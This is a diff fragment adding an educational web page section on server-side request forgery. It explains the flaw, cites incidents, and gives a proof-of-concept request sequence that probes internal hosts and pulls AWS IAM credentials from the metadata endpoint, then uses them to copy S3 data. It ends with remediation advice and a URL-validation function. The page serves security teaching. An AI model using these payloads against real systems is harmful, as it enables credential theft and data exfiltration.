+        <span class="accordion__arrow">▼</span>
+      </div>
+      <div class="accordion__body">
+        <div class="accordion__content">
+          <div class="info-box info-box--explain">
+            <div class="info-box__title">📘 A. Explanation</div>
+            <div class="info-box__content">
+              <p><strong>New in 2021.</strong> SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send crafted requests to an unexpected destination, even through firewalls, VPNs, or network ACLs.</p>
+              <ul>
+                <li>Accessing internal services (127.0.0.1, internal DNS names)</li>
+                <li>Reading cloud metadata (AWS 169.254.169.254, Azure, GCP)</li>
+                <li>Port scanning internal networks</li>
+                <li>Accessing internal APIs not exposed to the internet</li>
+                <li>Bypassing firewall rules using the server as a proxy</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="info-box info-box--example">
+            <div class="info-box__title">🟣 B. Real-World Example</div>
+            <div class="info-box__content">
+              <p><strong>Capital One (2019):</strong> An SSRF vulnerability in the WAF allowed an ex-AWS employee to access the EC2 metadata service and obtain IAM role credentials. This led to the theft of 100+ million credit card applications and social security numbers from S3 buckets.</p>
+              <p><strong>GitLab (2021):</strong> An SSRF bug allowed attackers to make the GitLab server send HTTP requests to arbitrary internal hosts, potentially accessing internal services and cloud metadata.</p>
+            </div>
+          </div>
+
+          <div class="info-box info-box--exploit">
+            <div class="info-box__title">🔴 C. How the Exploit Happens (POC)</div>
+            <div class="info-box__content">
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">HTTP — AWS Metadata SSRF</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code># Vulnerable endpoint: Image preview fetches any URL
+POST /api/image-preview
+{"url": "https://example.com/photo.jpg"}
+→ 200 OK: (renders image)
+
+# Step 1: Attacker probes internal network
+POST /api/image-preview
+{"url": "http://127.0.0.1:8080/admin"}
+→ 200 OK: Returns internal admin panel HTML!
+
+# Step 2: Access AWS EC2 metadata
+POST /api/image-preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+→ 200 OK: "my-app-role"
+
+# Step 3: Get IAM credentials
+POST /api/image-preview
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"}
+→ 200 OK:
+{
+  "AccessKeyId": "AKIA...",
+  "SecretAccessKey": "wJalr...",
+  "Token": "FwoGZX..."
+}
+# 💀 Attacker now has AWS credentials! Can access S3, EC2, RDS...
+
+# Step 4: Use stolen credentials
+aws s3 ls --profile stolen   → Lists all S3 buckets
+aws s3 cp s3://customer-data/ . --recursive → Downloads everything</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="info-box info-box--remediation">
+            <div class="info-box__title">✅ D. Remediation</div>
+            <div class="info-box__content">
+              <ul>
+                <li><strong>Validate and sanitize</strong> all user-supplied URLs</li>
+                <li>Use <strong>allowlists</strong> for permitted domains and IP ranges</li>
+                <li><strong>Block private IP ranges</strong>: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 169.254.169.254</li>
+                <li>Use AWS <strong>IMDSv2</strong> (requires session token for metadata access)</li>
+                <li>Don't return <strong>raw response bodies</strong> to users</li>
+                <li>Implement <strong>network-level segmentation</strong> (firewall rules, security groups)</li>
+                <li>Use a dedicated <strong>proxy/gateway</strong> for outbound requests</li>
+                <li>Disable URL redirects following</li>
+              </ul>
+              <div class="code-block">
+                <div class="code-block__header">
+                  <span class="code-block__lang">JavaScript — URL Validation</span>
+                  <button class="code-block__copy">Copy</button>
+                </div>
+                <pre><code>// ✅ SECURE: Validate URLs before fetching
+const { URL } = require('url');
+const dns = require('dns').promises;
+
+async function isUrlSafe(urlString) {
+  const url = new URL(urlString);
+
+  // Block private/internal schemes
+  if (!['http:', 'https:'].includes(url.protocol)) return false;
+
+  // Block private IPs
+  const { address } = await dns.lookup(url.hostname);
+  const parts = address.split('.').map(Number);
+  if (parts[0] === 127 || parts[0] === 10 ||
+      (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
+      (parts[0] === 192 && parts[1] === 168) ||
+      address === '169.254.169.254') {
+    return false;  // Blocked!
+  }
+  return true;
+}</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /accordion -->
+
+</div>
+
+<%- include('partials/footer') %>
